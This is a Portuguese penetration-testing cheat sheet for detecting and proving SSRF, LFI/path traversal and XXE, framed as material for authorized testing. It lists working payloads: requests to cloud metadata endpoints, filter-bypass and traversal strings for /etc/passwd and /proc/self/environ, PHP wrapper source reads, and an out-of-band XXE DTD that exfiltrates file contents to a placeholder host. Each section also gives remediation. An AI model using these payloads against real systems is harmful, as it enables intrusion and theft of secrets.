# SSRF, LFI/Path Traversal e XXE — Cola de Detecção e PoC

> **USO AUTORIZADO.** Material para teste autorizado. Use PoCs **mínimas e não-destrutivas** (ler `/etc/hostname`, metadados, ou provar callback OOB). Não pivote para sistemas fora do escopo nem leia segredos além do necessário para evidenciar o achado. Documente e pare na prova de conceito.

---

## 1. SSRF (Server-Side Request Forgery)

### 1.1 Onde testar
Qualquer parâmetro que faça o servidor buscar uma URL/recurso: webhooks, `url=`, `image=`, `feed=`, `redirect=`, importadores, geradores de PDF/thumbnail, integrações, SSO/OIDC `redirect_uri`, parsers de XML/SVG.

### 1.2 Detecção por canal lateral (OOB) — o método mais confiável
```text
http://OAST.example/                 # Burp Collaborator / interactsh
http://suri-<id>.oast.example/
```
**Sinal:** o listener OOB recebe requisição DNS/HTTP **originada do IP do servidor alvo**.

### 1.3 Alvos internos / cloud metadata (PoC de impacto)
```text
http://127.0.0.1:80/
http://localhost/admin
http://169.254.169.254/latest/meta-data/                 # AWS IMDSv1
http://169.254.169.254/latest/api/token                  # IMDSv2 (PUT)
http://metadata.google.internal/computeMetadata/v1/       # GCP (header Metadata-Flavor)
http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure
http://[::1]/                                            # IPv6 loopback
```
**Sinal:** resposta com conteúdo interno (lista de metadados, página de admin local, banner de serviço interno).

### 1.4 Bypass de filtros (allowlist/denylist fraca)
```text
http://127.0.0.1   →  http://127.1  /  http://0177.0.0.1  /  http://2130706433  (decimal)
http://0/  http://[::]  http://0.0.0.0
DNS rebinding:     http://rebind.attacker.example
Redirect aberto:   http://allowed.com/redirect?to=http://169.254.169.254
Confusão de parser: http://allowed.com@127.0.0.1/  /  http://127.0.0.1#@allowed.com
Esquemas:          file:///etc/passwd  gopher://  dict://  ftp://
```

### 1.5 Remediação
- **Allowlist** de hosts/domínios e esquemas permitidos (apenas `http`/`https`); negar por padrão.
- Resolver o hostname e validar o IP **resolvido** contra ranges privados/link-local (`127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254/16`, `::1`) — re-validar após redirects (anti-rebinding).
- Desabilitar redirects automáticos ou validar cada salto.
- Bloquear acesso ao endpoint de metadados; usar **IMDSv2** (token obrigatório) na AWS.
- Segmentação de rede / egress firewall para o serviço que faz fetch.

---

## 2. LFI / Path Traversal

### 2.1 Detecção (traversal clássico)
```text
../../../../etc/passwd
....//....//....//etc/passwd          (bypass de filtro "../" simples)
..%2f..%2f..%2fetc%2fpasswd           (URL-encoded)
..%252f..%252fetc%252fpasswd          (double-encoded)
%2e%2e%2f%2e%2e%2fetc%2fpasswd
/etc/passwd%00                        (null byte — apps legados)
..\..\..\windows\win.ini             (Windows)
```
**Sinal:** conteúdo de `/etc/passwd` (linhas `root:x:0:0:`) ou `win.ini` na resposta.

### 2.2 Wrappers PHP (leitura de fonte / PoC)
```text
php://filter/convert.base64-encode/resource=index.php     # lê fonte em base64
php://filter/read=string.rot13/resource=config.php
data://text/plain;base64,<...>
```
**Sinal:** código-fonte retornado (decodificar base64).

### 2.3 Arquivos úteis para prova (não-sensíveis quando possível)
```text
/etc/hostname            /etc/passwd            /proc/self/environ
/proc/self/cmdline       /var/log/...           C:\Windows\win.ini
```

### 2.4 Remediação
- Não passar input do usuário para APIs de filesystem. Usar **identificadores indiretos** (ID → mapa para caminho fixo).
- Canonicalizar o caminho (`realpath`) e verificar que está **dentro** do diretório base permitido.
- Allowlist de nomes/extensões; rejeitar `../`, `%00`, encodings e caracteres de path.
- Privilégios mínimos do processo; chroot/jail quando aplicável.
- Desabilitar wrappers perigosos (`allow_url_include=Off`, `allow_url_fopen=Off` no PHP).

---

## 3. XXE (XML External Entity)

### 3.1 Onde testar
Endpoints que aceitam XML: SOAP, SAML, RSS/Atom, `Content-Type: application/xml` ou `text/xml`, uploads `.docx`/`.xlsx`/`.svg` (XML por dentro), APIs que aceitam XML como alternativa a JSON.

### 3.2 Detecção — leitura de arquivo local (classic)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<root>&xxe;</root>
```
**Sinal:** o conteúdo do arquivo aparece refletido na resposta no lugar de `&xxe;`.

### 3.3 SSRF via XXE
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root>&xxe;</root>
```

### 3.4 Blind XXE / OOB (sem reflexão direta)
DTD externo hospedado em listener autorizado (Collaborator/interactsh):
```xml
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://OAST.example/evil.dtd">
  %ext;
]>
```
Conteúdo de `evil.dtd` (PoC de exfiltração OOB benigna):
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://OAST.example/?x=%file;'>">
%eval;
%exfil;
```
**Sinal:** callback OOB chega com o conteúdo do arquivo no parâmetro. (Detecção de blind XXE simples: só o callback de `%ext;` já confirma o parsing de entidade externa.)

### 3.5 XInclude (quando não controla o DOCTYPE)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</foo>
```

### 3.6 Remediação
- **Desabilitar DTDs e entidades externas** no parser XML (defesa primária):
  - Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
  - .NET: `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`
  - PHP/libxml: `libxml_set_external_entity_loader(null)` (entidades externas desabilitadas por padrão em libxml >= 2.9)
  - Python: usar `defusedxml` em vez de `xml.etree`/`lxml` cru.
- Preferir formatos menos perigosos (JSON) quando possível.
- Desabilitar resolução de entidades de parâmetro e expansão de entidades.
- Validar/limitar uploads que contêm XML (SVG/Office).
- Egress firewall (mitiga OOB e SSRF via XXE).

---

## Apêndice — Listener OOB (comum a SSRF/CMDi/XXE)
```bash
interactsh-client            # gera domínio + mostra callbacks DNS/HTTP/SMTP
# Burp Suite Pro → Collaborator (recomendado em engajamentos)
```
Um callback originado do **IP do alvo** é a evidência mais forte de SSRF/blind XXE/command injection cega.
